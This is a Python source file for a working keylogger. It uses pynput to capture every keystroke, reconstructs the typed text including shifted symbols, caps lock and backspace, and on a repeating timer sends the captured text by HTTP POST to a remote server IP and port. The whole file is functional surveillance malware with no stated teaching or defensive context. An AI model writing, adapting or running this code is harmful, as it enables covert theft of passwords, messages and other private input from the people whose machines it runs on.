from pynput import keyboard
from pynput.keyboard import Key, KeyCode
import threading
import requests
import json
from datetime import datetime
import os
import sys

sys.dont_write_bytecode = True

class KeyLogger:

    def __init__(self, interval, port, server_ip):
        # global variable text where keystrokes are saved as a string which is sent to server
        self.server_ip = server_ip  
        self.port = port
        self.interval = interval
        self.text = ""
        self.shift_pressed = False
        self.capslock_on = False
        self.current_date = datetime.now().date()
        self.log_filename = self._get_log_filename()
    
        self.shift_map = { 
            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
            '`': '~', '-': '_', '=': '+', '[': '{', ']': '}',
            '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?' 
        }
    def _get_log_filename(self):
        today = datetime.now().strftime("%Y-%m-%d")
        return f"keyboard_{today}.txt"
    
    def _send_post_request(self):
        now = datetime.now()
        if now.date() != self.current_date:
            self.current_date = now.date()
            self.log_filename = self._get_log_filename()


        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = json.dumps({
            "timestamp": timestamp,
            "keyboardData": self.text
            })
        try:
            requests.post(f"http://{self.server_ip}:{self.port}", 
                          data=payload, 
                          headers={"Content-Type" : "application/json"}
                          )
            # with open(self.log_filename, "a") as f:
                #f.write(f"{timestamp} - {self.text}\n")
        except:
            print("Failed to send log!")

        finally:
            self.text = ""
            timer = threading.Timer(self.interval, self._send_post_request)
            timer.start()


    def _on_press(self, key):
        try:
            print(f"Pressed:{key}")

            if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                self.shift_pressed = True
            elif key == keyboard.Key.caps_lock:
                self.capslock_on = not self.capslock_on
            elif key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace:
                self.text =  self.text [:-1]
            elif key == keyboard.Key.esc:
                print ("ESC pressed. Stopping Listener")
                os._exit(0)
                return False # stops listener
            elif isinstance(key, keyboard.KeyCode):
                char = key.char
                if char is not None:
    
                    if self.shift_pressed and char in self.shift_map:
                        self.text += self.shift_map[char]
                    elif self.shift_pressed:
                        self.text += char.upper()
                    elif self.capslock_on and char.isalpha():
                        self.text += char.upper()
                    else:
                        self.text += char

        except Exception as e:
            print(f"[ERROR] {e}")

    def _on_release(self, key):
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            self.shift_pressed = False

    def start(self):
        self._send_post_request()
        with keyboard.Listener(on_press=self._on_press,
                               on_release=self._on_release
        ) as listener:
            listener.join()